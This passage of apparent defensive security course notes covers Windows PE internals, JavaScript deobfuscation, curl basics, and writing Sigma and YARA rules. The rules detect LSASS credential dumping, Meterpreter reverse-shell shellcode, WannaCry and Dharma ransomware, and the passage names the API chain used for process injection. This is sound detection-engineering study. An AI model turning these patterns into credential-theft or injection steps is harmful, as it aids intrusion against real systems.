  - **Call Flow**: The function call goes from `kernel32.dll` -> `NTDLL.DLL` -> `NtReadVirtualMemory` -> kernel syscall.
  - The **System Service Descriptor Table (SSDT)** manages system service routines, mapping system calls to kernel functions.
  - The kernel validates access and performs the read, then transitions back to user mode with the requested data.

**Portable Executable (PE) Format**

Windows uses the **PE format** for executables, DLLs, etc. Knowledge of PE structure is essential for analyzing executables, identifying malicious code, and extracting IOCs.

**Common PE Sections**

1. **.text**: Executable code.
2. **.data**: Initialized global/static variables.
3. **.rdata**: Read-only data like constants and strings.
4. **.pdata**: Exception handling data.
5. **.bss**: Uninitialized data.
6. **.rsrc**: Embedded resources (icons, images).
7. **.idata**: Imported functions.
8. **.edata**: Exported functions.
9. **.reloc**: Relocation data for loading.

Analyzing PE sections reveals information about the code structure, imports, exports, and embedded resources.

**Processes**

A **process** represents an executing program with various system resources:

- **PID**: Unique identifier for tracking.
- **Virtual Address Space**: Memory space for code, data, stack, etc.
- **Executable Code**: Instructions and resources on disk.
- **Handles Table**: References for resources like files, devices.
- **Security Context**: Access rights through tokens.
- **Threads**: Units of execution within the process.

Understanding these helps track malware behavior, resource access, and memory management.

**Dynamic-Link Library (DLL)**

DLLs contain reusable functions and resources used by applications and malware alike. Malware may exploit DLL imports and exports for executing malicious actions.

**Import Functions**

- Functions from external libraries, linked at runtime, facilitate system interactions.
- **Example of Malware Injection**: Functions like `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` are used for injecting code into another process.

**Export Functions**

- Functions that DLLs provide for other applications, acting as an interface for interaction.
- **Example**: `Kernel32.dll` exports, viewed via tools like CFF Explorer or x64dbg, provide insights into OS-level functions available to processes.

**10. JavaScript Deobfuscation**

#### **Code Analysis**

The **generateSerial** function in the JavaScript file `secret.js` creates and sends a **POST request** to `/serial.php` using an `XMLHttpRequest` object, but without any data in the body or handling of a response. Here’s a breakdown of the code and what it implies:

**Code Overview**

```
'use strict';
function generateSerial() {
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
```

**Code Analysis Steps**

1. **Variables and Initialization**:
  - `xhr`: Creates a new `XMLHttpRequest` object, which is commonly used to make HTTP requests in JavaScript.
  - `url`: Stores the endpoint `/serial.php`, presumed to be on the same domain as no full URL is specified.
2. **Function Logic**:
  - `xhr.open("POST", url, true)`: Configures the request to use the POST method and the specified URL (`/serial.php`). The third parameter `true` indicates that the request is asynchronous.
  - `xhr.send(null)`: Sends the request without any data, effectively making an empty POST request to `/serial.php`.
3. **Purpose and Usage**:
  - This function seems designed to send a request to `/serial.php`, possibly to generate or verify a serial number on the server-side. It does not yet send data or process a response, suggesting it’s either incomplete or meant to be used alongside other code or events, like clicking a button labeled “Generate Serial.”
  - Since the function does not interact with the page (no HTML elements observed for triggering this function), it appears it may not be in active use yet.

**Security Implications**

Testing this function by triggering it manually or replicating the HTTP request could uncover a hidden server-side functionality. Since the code is not fully implemented or visible in the application UI, the `/serial.php` endpoint may contain **unfinished features or security vulnerabilities** (e.g., insufficient validation, improper access control).

**Next Steps**

1. **Replicate the Request**: Use a tool like `curl` or a browser's developer console to send an empty POST request to `/serial.php`.
2. **Inspect Server Response**: Analyze the server’s response to understand what the `/serial.php` endpoint is designed to do.
3. **Evaluate for Potential Vulnerabilities**: Look for signs of potential issues in the endpoint, such as debug information, error messages, or unintended behaviors that could indicate vulnerabilities.

#### **Decoding**

**Common Encoding Techniques**

1. **Base64 Encoding**:
  - **Purpose**: Converts data to a readable alphanumeric format with `+` and `/`, adding `=` as padding to ensure length is a multiple of 4.
  - **Spotting Base64**: Often contains alphanumeric characters, `+`, `/`, and ends with `=` for padding.
  - **Encoding in Base64**:
    ```
    echo "<https://www.hackthebox.eu/>" | base64
    ```
  - **Decoding Base64**:
    ```
    echo "aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K" | base64 -d
    ```
  - **Example**: The encoded response `ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=` can be decoded to reveal the hidden message:
    ```
    echo "ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=" | base64 -d
    ```
2. **Hex Encoding**:
  - **Purpose**: Represents each character by its hexadecimal ASCII value.
  - **Spotting Hex**: Only includes characters `0-9` and `a-f`.
  - **Encoding in Hex**:
    ```
    echo "<https://www.hackthebox.eu/>" | xxd -p
    ```
  - **Decoding Hex**:
    ```
    echo "68747470733a2f2f7777772e6861636b746865626f782e65752f0a" | xxd -p -r
    ```
3. **Caesar Cipher / ROT13**:
  - **Purpose**: Shifts each letter by a set number (e.g., `ROT13` shifts each letter 13 positions forward).
  - **Spotting Caesar Cipher**: Retains recognizable patterns since each character shifts to another within the alphabet.
  - **Encoding & Decoding with ROT13**:
    ```
    echo "<https://www.hackthebox.eu/>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    ```
  - **Decoding ROT13** (same command can decode since it's reversible):
    ```
    echo "uggcf://jjj.unpxgurobk.rh/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    ```

**Identifying Encoding Types**

Tools like **Cipher Identifier** can help recognize various encoding types. For strings that don’t fit common patterns, these tools can automatically determine possible encoding types.

**Advanced Encoding & Encryption**

While encoding transforms text into a different format, **encryption** requires a key and is used for security. Without the key, encrypted data is challenging to decode, making it a powerful method for securely obfuscating information.

In real-world scenarios, we may use these encoding and encryption techniques to identify hidden information, test vulnerabilities, and conduct comprehensive code analysis.

#### **HTTP Requests**

**cURL Basics**

1. **Basic GET Request**: To fetch a webpage’s content, we simply specify the URL with `curl`:
  ```
  curl http://SERVER_IP:PORT/
  ```
  Example Output:
  ```
  </html>
  <!DOCTYPE html>

  <head>
      <title>Secret Serial Generator</title>
      ...
      <h1>Secret Serial Generator</h1>
      <p>This page generates secret serials!</p>
  </div>
  </body>
  </html>
  ```
  This output matches what we saw when inspecting the page source earlier.
2. **Basic POST Request**: To send a `POST` request (similar to what the `generateSerial` function does), we can use the `X POST` flag:
  ```
  curl -s http://SERVER_IP:PORT/ -X POST
  ```
  Here, the `-s` option (silent mode) is used to suppress progress and error messages, displaying only the response content.
3. **POST Request with Data**: Typically, `POST` requests include data sent in the request body. For this, we add the `d` option to specify data parameters:
  ```
  curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"
  ```

**Next Steps**

In the following section, we’ll simulate the exact `POST` request to `/serial.php` as defined in `generateSerial`. Although this function does not send data, we can use `cURL` to explore possible responses from the server, gaining further insights into the endpoint’s functionality.

#### **Tools**

**Tools Used**

| **Tool** | **Use Case** |
|---|---|
| [https://jsconsole.com](https://jsconsole.com/) | Test run code |
| [https://javascript-minifier.com/](https://javascript-minifier.com/) | `Code minification` means having the entire code in a single (often very long) line. |
| [http://beautifytools.com/javascript-obfuscator.php](http://beautifytools.com/javascript-obfuscator.php) | Packing / Obfuscating |
| [https://obfuscator.io/](https://obfuscator.io/) | Advanced Obfuscation |
| [https://beautifier.io/](https://beautifier.io/) | Beautifier |
| [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html) | Deobfuscation |

**11. YARA & Sigma for SOC ANalysts**

#### **Developing Sigma Rules**

**Overview**

This guide walks through creating Sigma rules manually, using real-world examples to detect suspicious activities.

**Example 1: Detecting LSASS Credential Dumping**

In this scenario, the `shell.exe` process (mimikatz) attempts to access `lsass.exe` memory. Sysmon Event ID 10 logs this activity when `shell.exe` tries to access the LSASS memory, capturing it in event logs.

**Relevant Information**

- **Sysmon Event ID**: 10
- **Critical Fields**:
  - `TargetImage`: Specifies the target process (e.g., `lsass.exe`)
  - `GrantedAccess`: Specific permissions, commonly `0x1010` (read and query access)

**LSASS Credential Dumping Detection Rule**

```
title: LSASS Access with rare GrantedAccess flag
status: experimental
description: Detects process access to LSASS memory with suspicious access flag 0x1010
date: 2023/07/08
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|endswith: '0x1010'
    condition: selection
```

**Explanation**

1. **Title**: Clearly describes the rule's purpose.
2. **Status**: Indicates it’s still in testing.
3. **Detection Criteria**:
  - **TargetImage**: Matches logs where the target process ends with `lsass.exe`.
  - **GrantedAccess**: Ensures the access flag is `0x1010`.
  - **Condition**: Triggers if the criteria in `selection` are met.

**Running the Rule with sigmac**

To convert the Sigma rule into a PowerShell query:

```
python sigmac -t powershell 'C:\\Rules\\sigma\\proc_access_win_lsass_access.yml'
```

**Robust Rule: Adding Filters for Suspicious Paths and False Positives**

A more advanced version includes filtering out common false positives:

```
title: LSASS Access From Program in Potentially Suspicious Folder
id: fa34b441-961a-42fa-a100-ecc28c886725
status: experimental
description: Detects process access to LSASS memory with suspicious access flags and from a potentially suspicious folder
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|endswith:
            - '10'
            - '30'
            - '50'
            - '70'
            - '90'
            - 'B0'
            - 'D0'
            - 'F0'
    SourceImage|contains:
            - '\\Temp\\'
            - '\\Users\\Public\\'
    condition: selection and not 1 of filter_optional_*
```

**Example 2: Detecting Multiple Failed Logins from Single Source**

Event ID 4776 logs credential validation attempts. When multiple failed attempts are observed from a single workstation, it may indicate an attempted breach.

```
title: Failed NTLM Logins with Different Accounts from Single Source System
id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538
logsource:
    product: windows
    service: security
detection:
    selection2:
        EventID: 4776
        TargetUserName: '*'
        Workstation: '*'
    condition: selection2 | count(TargetUserName) by Workstation > 3
```

**Explanation**

- **Logsource**: Focuses on Windows Security logs.
- **Detection**: Filters for Event ID 4776 and counts instances of `TargetUserName` by `Workstation`.
- **Condition**: Flags if a single source attempts more than three logins with different accounts.

**Sigma Rule Development Resources**

The following links provide additional guidance and best practices for Sigma rule development:

- Official Documentation: [https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide](https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide)
- Specification: [https://github.com/SigmaHQ/sigma-specification](https://github.com/SigmaHQ/sigma-specification)
- Sigma Development Articles: [https://tech-en.netlify.app/articles/en510480/](https://tech-en.netlify.app/articles/en510480/)

#### **Developing YARA Rules**

**1. Basic YARA Rule for UPX-packed Executables**

**Perform String Analysis**:

```
Kailez@htb[/htb]$ strings svchost.exe
```

**Sample YARA Rule**:

```
rule UPX_packed_executable {
    meta:
        description = "Detects UPX-packed executables"
    strings:
        $string_1 = "UPX0"
        $string_2 = "UPX1"
        $string_3 = "UPX2"
condition:
        all of them
}
```

**2. Generating a YARA Rule with yarGen**

**Command**:

```
Kailez@htb[/htb]$ python3 yarGen.py -m /home/htb-student/temp -o htb_sample.yar
```

**Result**:

```
Kailez@htb[/htb]$ cat htb_sample.yar
```

**3. Manual YARA Rule Development Examples**

**Example 1: ZoxPNG RAT Used by APT17**

1. **String Analysis**:
  ```
  Kailez@htb[/htb]$ strings legit.exe
  ```
2. **Calculate Imphash**:
  ```
  Kailez@htb[/htb]$ python3 imphash_calc.py /home/htb-student/Samples/YARASigma/legit.exe
  ```

**APT17 YARA Rule**:

```
import "pe"

rule APT17_Malware_Oct17_Gen {
    meta:
        description = "Detects APT17 malware"
        license = "Detection Rule License 1.1 <https://github.com/Neo23x0/signature-base/blob/master/LICENSE>"
        author = "Florian Roth (Nextron Systems)"
        reference = "<https://goo.gl/puVc9q>"
        date = "2017-10-03"
        hash1 = "0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2"
        hash2 = "07f93e49c7015b68e2542fc591ad2b4a1bc01349f79d48db67c53938ad4b525d"
        hash3 = "ee362a8161bd442073775363bf5fa1305abac2ce39b903d63df0d7121ba60550"
    strings:
        $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" fullword ascii
        $x2 = "http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM" ascii
        $s1 = "hWritePipe2 Error:%d" fullword ascii
        $s2 = "Not Support This Function!" fullword ascii
        $s3 = "Cookie: SESSIONID=%s" fullword ascii
        $s4 = "<http://0.0.0.0/1>" fullword ascii
        $s5 = "Content-Type: image/x-png" fullword ascii
        $s6 = "Accept-Language: en-US" fullword ascii
        $s7 = "IISCMD Error:%d" fullword ascii
        $s8 = "[IISEND=0x%08X][Recv:] 0x%08X %s" fullword ascii
condition:
        uint16(0) == 0x5a4d and filesize < 200KB and (
            pe.imphash() == "414bbd566b700ea021cfae3ad8f4d9b9" or
            1 of ($x*) or
            6 of them
        )
}
```

**Example 2: Neuron Used by Turla**

**Reverse Engineering with**`monodis`:

```
Kailez@htb[/htb]$ monodis --output=code Microsoft.Exchange.Service.exe
Kailez@htb[/htb]$ cat code
```

**Neuron Service YARA Rule**:

```
rule neuron_functions_classes_and_vars {
    meta:
        description = "Rule for detection of Neuron based on .NET functions and class names"
        author = "NCSC UK"
        reference = "<https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB>"
        reference2 = "<https://www.ncsc.gov.uk/alerts/turla-group-malware>"
        hash = "d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29"
    strings:
        $class1 = "StorageUtils" ascii
        $class2 = "WebServer" ascii
        $func1 = "AddConfigAsString" ascii
        $func2 = "EncryptScript" ascii
        $dotnetMagic = "BSJB" ascii
condition:
        uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and $dotnetMagic and 6 of them
}
```

**Example 3: Stonedrill Used in Shamoon 2.0 Attacks**

**Entropy Analysis**:

```
Kailez@htb[/htb]$ python3 entropy_pe_section.py -f /home/htb-student/Samples/YARASigma/sham2.exe
```

**Stonedrill YARA Rule**:

```
import "pe"
import "math"

rule susp_file_enumerator_with_encrypted_resource_101 {
    meta:
        copyright = "Kaspersky Lab"
        description = "Generic detection for samples that enumerate files with encrypted resource called 101"
        reference = "<https://securelist.com/from-shamoon-to-stonedrill/77725/>"
        hash = "2cd0a5f1e9bcce6807e57ec8477d222a"
    strings:
        $mz = "This program cannot be run in DOS mode."
        $a1 = "FindFirstFile" ascii wide nocase
        $a3 = "FindResource" ascii wide nocase
condition:
        uint16(0) == 0x5A4D and all of them and filesize < 700000 and
        pe.number_of_sections > 4 and pe.number_of_signatures == 0 and
        pe.number_of_resources > 1 and pe.number_of_resources < 15 and
        for any i in (0..pe.number_of_resources - 1):
        ( (math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and
          pe.resources[i].id == 101 and pe.resources[i].length > 20000 and
          pe.resources[i].language == 0 and
          not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
        )
}
```

---

**Resources for YARA Rule Development**

- **Official Documentation**: [YARA Documentation](https://yara.readthedocs.io/)
- **Kaspersky Guide**: Effective YARA Rule Development

#### **Hunting Evil with Sigma (Chainsaw Edition)**

In cybersecurity, time is of the essence. Rapid analysis allows us to not just identify but also respond to threats before they escalate. When we're up against the clock, racing to find a needle in a haystack of Windows Event Logs without access to a SIEM, Sigma rules combined with tools like Chainsaw and Zircolite are our best allies.

Both tools allow us to use Sigma rules to scan not just one, but multiple EVTX files concurrently, offering a broader and more comprehensive scan in a very efficient manner.

Let's now navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

**Scanning Windows Event Logs With Chainsaw**

Chainsaw is a freely available tool designed to swiftly pinpoint security threats within Windows Event Logs. This tool enables efficient keyword-based event log searches and is equipped with integrated support for Sigma detection rules as well as custom Chainsaw rules. Therefore, it serves as a valuable asset for validating our Sigma rules by applying them to actual event logs.

Chainsaw can be found inside the `C:\\Tools\\chainsaw` directory of this section's target.

Let's first run Chainsaw with `-h` flag to see the help menu.

**Example 1: Hunting for Multiple Failed Logins From Single Source With Sigma**

Let's put Chainsaw to work by applying our most recent Sigma rule, `win_security_susp_failed_logons_single_source2.yml` (available at `C:\\Rules\\sigma`), to `lab_events_2.evtx` (available at `C:\\Events\\YARASigma\\lab_events_2.evtx`) that contains multiple failed login attempts from the same source.

```
PS C:\\Tools\\chainsaw> .\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_2.evtx -s C:\\Rules\\sigma\\win_security_susp_failed_logons_single_source2.yml --mapping .\\mappings\\sigma-event-logs-all.yml
```

Output:

```
[+] 1 Detections found on 1 documents
```

Our Sigma rule was able to identify the multiple failed login attempts against NOUSER.

**Example 2: Hunting for Abnormal PowerShell Command Line Size With Sigma (Based on Event ID 4688)**

Firstly, let's set the stage by recognizing that PowerShell, being a highly flexible scripting language, is an attractive target for attackers. Its deep integration with Windows APIs and .NET Framework makes it an ideal candidate for a variety of post-exploitation activities.

A Sigma rule that can detect abnormally long PowerShell command lines can be found inside the `C:\\Rules\\sigma` directory of this section's target, saved as `proc_creation_win_powershell_abnormal_commandline_size.yml`.

```
title: Unusually Long PowerShell CommandLine
id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
status: test
description: Detects unusually long PowerShell command lines with a length of 1000 characters or more
references:
    - <https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse>
author: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas
date: 2020/10/06
modified: 2023/04/14
tags:
    - attack.execution
    - attack.t1059.001
    - detection.threat_hunting
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
            - '\\powershell.exe'
            - '\\pwsh.exe'
            - '\\cmd.exe'
    selection_powershell:
        CommandLine|contains:
            - 'powershell.exe'
            - 'pwsh.exe'
    selection_length:
        CommandLine|re: '.{1000,}'
    condition: selection and selection_powershell and selection_length
falsepositives:
    - Unknown
level: low
```

**Applying the Rule**

We applied the abovementioned Sigma rule, `proc_creation_win_powershell_abnormal_commandline_size.yml`, to `lab_events_3.evtx` (available at `C:\\Events\\YARASigma\\lab_events_3.evtx`, thanks to mdecrevoisier) that contains 4688 events with abnormally long PowerShell commands.

```
PS C:\\Tools\\chainsaw> .\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_3.evtx -s C:\\Rules\\sigma\\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\\mappings\\sigma-event-logs-all-new.yml
```

Output:

```
[+] 3 Detections found on 3 documents
```

Our Sigma rule successfully uncovered all three abnormally long PowerShell commands that exist inside `lab_events_3.evtx`.

Remember that configuration when it comes to using or translating Sigma rules is of paramount importance!

#### **Hunting Evil with Sigma (Splunk Edition)**

As discussed when introducing Sigma, Sigma rules revolutionize our approach to log analysis and threat detection. Acting as a universal translator, Sigma brings a level of abstraction to event logs, removing the need for SIEM-specific query languages and enabling the use of common detection logic across platforms.

Let's validate this approach by converting two Sigma rules into Splunk’s SPL format and examining the outcomes.

**Example 1: Hunting for MiniDump Function Abuse to Dump LSASS's Memory (comsvcs.dll via rundll32)**

A Sigma rule named `proc_access_win_lsass_dump_comsvcs_dll.yml` is available in the following directory:

- `C:\\Tools\\chainsaw\\sigma\\rules\\windows\\process_access`

This Sigma rule detects adversaries who use the MiniDump export function of `comsvcs.dll` via `rundll32` to perform a memory dump from LSASS.

To convert this rule to a Splunk-compatible query, we can use `sigmac` as follows:

```
PS C:\\Tools\\sigma-0.21\\tools> python sigmac -t splunk C:\\Tools\\chainsaw\\sigma\\rules\\windows\\process_access\\proc_access_win_lsass_dump_comsvcs_dll.yml -c .\\config\\splunk-windows.yml
```

This command generates the following SPL query:

```
(TargetImage="*\\\\lsass.exe" SourceImage="C:\\\\Windows\\\\System32\\\\rundll32.exe" CallTrace="*comsvcs.dll*")
```

To validate the rule in Splunk:

1. Navigate to `http://[Target IP]:8000`.
2. Open the **"Search & Reporting"** application.
3. Submit the Splunk search query generated by `sigmac`.

Result: The SPL query successfully detects MiniDump function abuse to dump LSASS's memory.

**Example 2: Hunting for Notepad Spawning Suspicious Child Processes**

A Sigma rule named `proc_creation_win_notepad_susp_child.yml` is available in:

- `C:\\Rules\\sigma`

This Sigma rule detects cases where `notepad.exe` spawns suspicious child processes.

To convert this rule to SPL, we use `sigmac` as follows:

```
PS C:\\Tools\\sigma-0.21\\tools> python sigmac -t splunk C:\\Rules\\sigma\\proc_creation_win_notepad_susp_child.yml -c .\\config\\splunk-windows.yml
```

The command produces the following SPL query:

```
(ParentImage="*\\\\notepad.exe" (Image="*\\\\powershell.exe" OR Image="*\\\\pwsh.exe" OR Image="*\\\\cmd.exe" OR Image="*\\\\mshta.exe" OR Image="*\\\\cscript.exe" OR Image="*\\\\wscript.exe" OR Image="*\\\\taskkill.exe" OR Image="*\\\\regsvr32.exe" OR Image="*\\\\rundll32.exe" OR Image="*\\\\calc.exe"))
```

To validate the rule in Splunk:

1. Navigate to `http://[Target IP]:8000`.
2. Open the **"Search & Reporting"** application.
3. Submit the generated SPL query.

Result: The SPL query detects instances where `notepad.exe` spawns suspicious processes, such as PowerShell.

**Customizing Sigma for SIEM Compatibility**

In many cases, Sigma configuration files, located in the following directory:

- `C:\\Tools\\sigma-0.21\\tools\\config`

may require customization to generate accurate and usable SIEM queries. These configuration adjustments help ensure the translated rules align with specific data fields and log structures in the target SIEM environment.

#### **Hunting Evil with YARA (Linux)**

**Overview**

When direct access to a system is restricted, memory captures can still allow us to investigate potential threats. By using YARA on these memory snapshots, Security Analysts can scan for indicators of compromise even when the system itself remains inaccessible.

**Key Process:**

1. **Create YARA Rules**: Develop rules targeting memory-based malware traits or suspicious behaviors.
2. **Compile Rules**: Using `yarac`, compile YARA rules to `.yrc` binary format (optional for better performance).
3. **Capture Memory Image**: Use tools like DumpIt, MemDump, Belkasoft RAM Capturer, Magnet RAM Capture, FTK Imager, or LiME (Linux Memory Extractor).
4. **Scan Memory Image with YARA**: Run YARA on the memory image to detect matches.

**Example Memory Scan with YARA**

- **Memory Image**: `compromised_system.raw` from `/home/htb-student/MemoryDumps`.
- **YARA Rule File**: `wannacry_artifacts_memory.yar` located in `/home/htb-student/Rules/yara`.

```
yara /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar /home/htb-student/MemoryDumps/compromised_system.raw --print-strings
```

**Sample Output:**

Detected patterns related to WannaCry ransomware, such as `tasksche.exe` and other known artifacts.

**Integrating YARA with Volatility for Memory Forensics**

**Volatility Framework**

Volatility is a robust tool for analyzing memory images across multiple OS platforms. Using YARA within Volatility (via the `yarascan` plugin), Analysts can scan for specific malware indicators within the memory.

**Example - Single Pattern Search**

Searching for a specific hard-coded URI without a YARA file:

```
vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
```

- **Output**: Finds occurrences of this URI within the memory image.

**Example - Multiple Rule Scanning**

Applying a set of YARA rules using the `-y` option with Volatility:

```
vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar
```

**Sample YARA Rule for WannaCry**

```
rule Ransomware_WannaCry {
    meta:
        author = "Madhukar Raina"
        version = "1.1"
        description = "Detect strings from WannaCry ransomware"
        reference = "<https://www.virustotal.com>"

    strings:
        $wannacry_payload_str1 = "tasksche.exe" fullword ascii
        $wannacry_payload_str2 = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry_payload_str3 = "mssecsvc.exe" fullword ascii
        $wannacry_payload_str4 = "diskpart.exe" fullword ascii
        $wannacry_payload_str5 = "lhdfrgui.exe" fullword ascii

condition: 3 of them
}
```

- **Output**: Identifies specific WannaCry artifacts in the memory image.

#### **Hunting Evil with YARA (Web)**

**Overview**

**[Unpac.Me](http://unpac.me/)** offers a robust solution for malware unpacking and enables Security Analysts to run YARA rules over a vast database of malware submissions. This platform provides access to a commercial-grade malware dataset, making it a valuable resource for SOC analysts and malware researchers.

**Testing YARA Rules with****[Unpac.Me](http://unpac.me/)**

For example, let's consider the following YARA rule targeting Dharma ransomware:

```
rule ransomware_dharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "Detect strings from Dharma ransomware"
        reference = "<https://www.virustotal.com>"

    strings:
        $string_pdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462}
        $string_ssss = { 73 73 73 73 73 62 73 73 73}

condition: all of them
}
```

**Steps for Running a YARA Hunt on****[Unpac.Me](http://unpac.me/)**

1. **Register**: Sign up for a free account on [Unpac.Me](http://unpac.me/).
2. **Start a New Hunt**:
  - Navigate to **Yara Hunt** and select **New Hunt**.
  - Paste the YARA rule into the rule entry field.
3. **Validate and Scan**:
  - Click **Validate** to ensure the rule is correct, then **Scan**.
4. **Review Results**: After scanning, [Unpac.Me](http://unpac.me/) displays results, showing matches within minutes.

#### **Hunting Evil with YARA (Windows)**

**Overview**

Using YARA on Windows systems is effective for identifying threats on disk and in memory.

1. **Connect to Target System**:
  - Launch the target system.
  - Use RDP to connect with provided credentials.

**Hunting for Malicious Executables on Disk**

- **Sample File**: `dharma_sample.exe` located in `C:\\Samples\\YARASigma`.
- **Hex Analysis**: Using HxD to inspect strings like `C:\\crysis\\Release\\PDB\\payload.pdb` and `sssssbsss`.
- **YARA Rule Example**: Detecting patterns in malicious executables.

```
rule ransomware_dharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "Detect strings from Dharma ransomware"
        reference = "<https://www.virustotal.com>"

    strings:
        $string_pdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462}
        $string_ssss = { 73 73 73 73 73 62 73 73 73}

condition: all of them
}
```

**Command to Execute YARA Scan on Files**

```
yara64.exe -s C:\\Rules\\yara\\dharma_ransomware.yar C:\\Samples\\YARASigma\\ -r 2>null
```

- **Detected Files**: `pdf_reader.exe`, `microsoft.com`, `check_updates.exe`, `KB5027505.exe`.

**Hunting for Malware in Running Processes**

- **Target Process**: Example with `meterpreter` shellcode injection.
- **YARA Rule for Metasploit Meterpreter**:

```
rule meterpreter_reverse_tcp_shellcode {
    meta:
        author = "FDD @ Cuckoo sandbox"
        description = "Metasploit meterpreter reverse tcp shellcode"

    strings:
        $s1 = { fce8 8?00 0000 60}
        $s2 = { 648b ??30}
        $s3 = { 4c77 2607}
        $s4 = "ws2_"
        $s5 = { 2980 6b00}
        $s6 = { ea0f dfe0}
        $s7 = { 99a5 7461}

condition: 5 of them
}
```

**Scanning Active Processes**

```
Get-Process | ForEach-Object { "Scanning with Yara for meterpreter shellcode on PID "+$_.id; & "yara64.exe" "C:\\Rules\\yara\\meterpreter_shellcode.yar" $_.id }
```

- **Result**: Detects shellcode in process PID 9084.

**Hunting for Evil Within ETW Data with YARA**

**Key ETW Providers**

- **Microsoft-Windows-Kernel-Process**: Tracks process activities.
- **Microsoft-Windows-Kernel-File**: Monitors file operations.
- **Microsoft-Windows-DNS-Client**: Logs DNS activity (useful for C2 detection).

**YARA and SilkETW Integration Example**

1. **PowerShell ETW Provider**:
  ```
  .\\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etw_ps_logs.json -l verbose -y C:\\Rules\\yara -yo Matches
  ```
  ```
  rule powershell_hello_world_yara {
      strings:
          $s0 = "Write-Host" ascii wide nocase
          $s1 = "Hello" ascii wide nocase
          $s2 = "from" ascii wide nocase
          $s3 = "PowerShell" ascii wide nocase
  condition: 3 of ($s*)
  }
  ```
  - **YARA Rule for PowerShell Strings**:
2. **DNS Client Provider**:
  ```
  .\\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etw_dns_logs.json -l verbose -y C:\\Rules\\yara -yo Matches
  ```
  ```
  rule dns_wannacry_domain {
      strings:
          $s1 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii wide nocase
  condition: $s1
  }
  ```
  - **YARA Rule for Wannacry Domain**:

#### **Sigma and Sigma Rules**

**Overview**

Sigma is a generic and standardized signature format that enables SOC analysts to create, share, and utilize detection rules for log analysis across different platforms. Written in YAML, Sigma rules offer cross-platform portability, allowing analysts to write a rule once and deploy it across various SIEM and EDR systems.

**Key Use Cases for Sigma Rules**

1. **Universal Log Analytics**: Write detection rules once and convert them to various SIEM formats.
2. **Community Rule Sharing**: Access and contribute to a growing library of community-shared Sigma rules.
3. **Incident Response**: Efficiently search logs for specific indicators during incidents.
4. **Proactive Threat Hunting**: Use Sigma rules to find anomalies or threats within datasets.
5. **Integration with Automation Tools**: Automate responses by using Sigma rules with SOAR platforms.
6. **Customization**: Tailor Sigma rules to specific environment needs.
7. **Gap Analysis**: Perform gap analysis by aligning custom rules with community standards.

**How Sigma Works**

Sigma expresses detection patterns in a structured format, with rules written in YAML. Sigma rules consist of:

- **Title, Description, and ID**: Basic rule information.
- **Log Source**: Specifies the target log type, platform, and application.
- **Detection Pattern**: Includes search identifiers and conditions for matching.
- **False Positives, Author, and Date**: Optional fields for context.

**Sigma Conversion (sigmac & pySigma)**

Sigma’s power lies in its convertibility. Tools like `sigmac` (and increasingly `pySigma`) transform Sigma rules into queries or configurations compatible with popular SIEMs (ElasticSearch, QRadar, Splunk, etc.).

**Sigma Rule Structure**

Sigma rules are YAML files with structured fields. Below is an example Sigma rule format.

```
title: Potential LethalHTA Technique Execution
id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471
status: test
description: Detects potential LethalHTA technique where "mshta.exe" is spawned by an "svchost.exe" process
references:
